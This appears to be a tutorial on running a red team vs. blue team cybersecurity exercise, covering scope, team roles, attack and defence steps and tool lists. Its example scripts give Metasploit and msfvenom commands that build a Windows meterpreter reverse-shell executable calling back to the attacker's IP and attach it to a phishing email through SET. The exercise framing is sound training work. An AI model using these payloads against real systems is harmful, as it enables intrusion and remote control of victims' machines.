/*Red Team vs Blue Team Simulation*/

Setting up a red team vs. blue team simulation involves careful planning and execution to create realistic attack scenarios and responses. Here's a step-by-step guide on how to design and execute this cybersecurity exercise.

Step-by-Step Guide:
1. Define Objectives and Scope
Objectives: Clearly define the goals of the exercise (e.g., test incident response, identify vulnerabilities, improve security posture).
Scope: Determine the boundaries of the exercise (e.g., which networks, systems, and applications will be involved).
2. Assemble Teams
Red Team: The attackers, often composed of penetration testers and ethical hackers.
Blue Team: The defenders, typically the internal security team responsible for protecting the network.
3. Set Up the Environment
Network Simulation: Use virtual networks or dedicated environments to simulate the production network.
Systems and Applications: Deploy systems and applications that mimic the real-world environment (e.g., web servers, databases, user workstations).
4. Design Attack Scenarios
Create realistic attack scenarios for the red team to execute. These can include:

Phishing Attacks: Crafting phishing emails to obtain credentials or deliver malware.
Exploitation of Vulnerabilities: Identifying and exploiting known vulnerabilities in systems and applications.
Privilege Escalation: Gaining higher-level access once inside the network.
Data Exfiltration: Attempting to steal sensitive data.
5. Implement Defensive Measures
The blue team should have various defensive measures in place:

Firewalls and Intrusion Detection Systems (IDS): Monitor and block unauthorized access.
Endpoint Protection: Antivirus and anti-malware software.
Security Information and Event Management (SIEM): Centralized logging and alerting.
Incident Response Plan: Procedures for responding to security incidents.
6. Execute the Exercise
Initial Access: The red team starts by attempting to gain initial access using techniques like phishing or exploiting vulnerabilities.
Lateral Movement: Once inside, the red team tries to move laterally across the network, escalating privileges and accessing critical systems.
Objectives: The red team aims to achieve specific objectives, such as stealing data or disrupting services.
Monitoring and Response: The blue team actively monitors for signs of intrusion and responds to incidents according to their incident response plan.
7. Post-Exercise Analysis
Debrief: Conduct a debriefing session with both teams to discuss what happened, what was successful, and what could be improved.
Report: Generate a detailed report outlining the attack methods, defensive responses, and recommendations for improving security.
Example Attack Scenario: Phishing and Exploitation
Red Team Actions:
Phishing Email: Craft a phishing email with a malicious attachment or link.
Initial Access: When a user clicks the link or opens the attachment, deploy a backdoor (e.g., Meterpreter).
Lateral Movement: Use tools like Mimikatz to extract credentials and move laterally across the network.
Privilege Escalation: Exploit vulnerabilities or use stolen credentials to escalate privileges.
Data Exfiltration: Attempt to access and exfiltrate sensitive data.
Blue Team Actions:
Email Filtering: Use email filters to detect and block phishing emails.
User Training: Conduct regular training to help users recognize phishing attempts.
Endpoint Detection and Response (EDR): Monitor for suspicious activities on endpoints.
Network Segmentation: Limit lateral movement by segmenting the network.
Incident Response: Follow the incident response plan to contain and eradicate the threat.
Tools and Resources
Attack Tools (Red Team):
Metasploit
Social-Engineer Toolkit (SET)
Mimikatz
Cobalt Strike
Defense Tools (Blue Team):
Splunk (SIEM)
Suricata (IDS)
OSSEC (Host Intrusion Detection)
Wireshark (Network Analysis)
ELK Stack (Logging and Monitoring)
Example Scripts
Red Team: Phishing Email with Metasploit
bash
Copy code
msfconsole

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <your_IP>
set LPORT 4444
exploit -j

# Generate payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_IP> LPORT=4444 -f exe > /tmp/malware.exe

# Social Engineer Toolkit for phishing email
setoolkit
# Follow the prompts to create a phishing email and attach the payload
Blue Team: Monitoring with Splunk
Install Splunk: Follow the installation instructions from the official website.
Set Up Data Inputs: Configure data inputs for logs, network traffic, and system events.
Create Alerts: Set up alerts for suspicious activities (e.g., multiple failed login attempts, execution of new binaries).
# Example Splunk alert for multiple failed logins
index=main sourcetype="winlogon" EventCode=4625 | stats count by Account_Name | where count > 5
